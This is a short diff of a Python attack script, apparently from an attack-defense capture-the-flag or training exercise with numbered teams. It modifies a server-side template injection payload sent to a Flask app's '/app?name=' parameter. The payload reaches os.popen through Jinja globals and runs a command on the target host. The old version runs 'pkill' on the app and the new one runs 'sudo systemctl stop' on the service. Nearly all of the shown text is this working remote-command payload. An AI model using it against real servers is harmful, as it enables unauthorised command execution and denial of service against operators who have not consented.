@@ -147,7 +147,7 @@ def web_attack(team_id):
 	except:
 		print("team", team_id, target + ":" + port, "could not connect:", url)
 	## SSTI(Stop server)の攻撃
-	uri = """/app?name={{request.application.__globals__.__builtins__.__import__("os").popen("pkill -f 'python3 /var/www/html/webapp/app.py'").read()}}"""
+	uri = """/app?name={{request.application.__globals__.__builtins__.__import__("os").popen("sudo systemctl stop http-flask.service").read()}}"""
 	q = (url + uri)
 	#print(q)
 	try:
